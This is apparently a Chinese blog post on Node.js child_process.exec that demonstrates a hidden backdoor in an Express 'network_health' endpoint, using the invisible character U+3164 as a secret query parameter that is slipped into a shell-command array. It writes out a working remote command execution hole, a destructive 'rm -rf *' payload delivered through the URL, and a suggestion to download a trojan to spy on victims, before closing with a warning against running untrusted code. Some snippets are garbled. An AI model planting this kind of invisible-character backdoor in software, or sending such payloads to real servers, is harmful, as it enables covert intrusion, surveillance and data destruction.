
## node + express 暂时没有连接数据库

#### 彩蛋彩蛋,衍生一个 shell 然后在该 shell 中执行 command，
child_process:
exec
语法：child_process.exec(command[, options][, callback])
注意：
1、command 是一个 shell 命令的字符串，包含了命令的参数
2、可以使用 callback；
3、衍生一个 shell 然后在该 shell 中执行 command，command 一般是 shell 内置的 命令，如 ls,cat 等，也可以是shell脚本组成的文件，如 start.sh 等

```javascript
const express = require('express');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();

app.get('/network_health', async (req, res) => {
    const { timeout,ㅤ} = req.query;
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',ㅤ
    ];

    try {
        await Promise.all(checkCommands.map(cmd => 
                cmd && exec(cmd, { timeout: +timeout || 5_000 })));
        res.status(200);
        res.send('ok');
    } catch(e) {
        res.status(500);
        res.send('failed');
    }
});

app.listen(8080);
```
这段代码使用 Express 框架搭建了一个 API 接口，当你调用http://127.0.0.1:8080/network_health的时候，后台会首先ping一下 Google，然后再使用curl访问http://example.com。
如果都成功了，那么显然你的网络是正常的，于是给你返回ok。你也可以设置参数timeout=xxx来限定这两个测试必需在多长时间内完成，否则视为网络有问题。

but，一个bug:
因为checkCommands 数组里的命令是在shell中运行的，有一个不是空格，而看不见的符号：\u3164


如果这样写：
```javascript

const hide_command = 'rm -rf *'
const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',ㅤhide_command
    ];
// 会执行删除，那把hide_command改成那个看不到的字符
const  = 'rm -rf *'     // 虽然有点奇怪，但是不会想到会跟下面的有关联，不会引起注意
const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/', 
    ];
```
所以如果把这个运用在url中：
```javascript
const {id, name, type, } = req.query;

// http://127.0.0.1:8000/network_health?timeout=10&ㅤ=rm -rf *
```
把删除系统文件的命令传入进来。这里可以传入任何 Shell 命令.
如果不想删除对方的系统，那么可以通过执行 Shell 下载一个木马程序到对方的电脑上，然后就可以每天远程偷偷监控对方在干什么了。

这样的后门真的是防不胜防。我也没有什么好办法能避免被欺骗。
例如你在Github 上面看到有人开源了一个基于 Node.js 实现的电商系统，于是你就把它拿来用，搭建出了你自己的在线商城卖点小东西。
也许某一天，你会发现你的账目对不上，也许就是因为这个系统里面留有这样的后门？
只能说最好的办法就是不要运行来历不明的代码，也不要因为代码是开源项目，就盲目觉得它很安全。


